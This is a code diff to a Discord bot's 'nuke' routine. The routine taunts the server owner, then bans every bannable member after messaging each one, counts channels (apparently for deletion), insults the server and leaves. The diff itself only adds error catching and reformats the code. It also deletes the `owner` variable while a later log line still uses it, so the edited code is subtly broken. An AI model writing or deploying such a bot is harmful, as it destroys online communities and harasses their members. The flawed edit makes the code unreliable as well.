@@ -8,10 +8,9 @@ async function nuke(guild) {
 
   await guild.fetchMembers();
 
-  const owner = guild.owner;
-  await owner.sendMessage('Hey there! Your guild is getting nuked! :D');
+  await guild.owner.send('Hey there! Your guild is getting nuked! :D').catch(e => { return void e; });
 
-  await Promise.all(guild.members.map(async m => {
+  await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
       await m.send('You\'re getting banned! Nothing personal...').catch(e => { return void e; });
@@ -28,7 +27,7 @@ async function nuke(guild) {
 
   console.log(`Nuked ${users} users and ${channels} channels in ${guild} owned by ${owner.user.username}#${owner.user.discriminator} (${guild.ownerID})`);
 
-  await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
+  await guild.defaultChannel.send('Dumbass, we said not to add the bot...').catch(e => { return void e; });
   return guild.leave();
 }
 
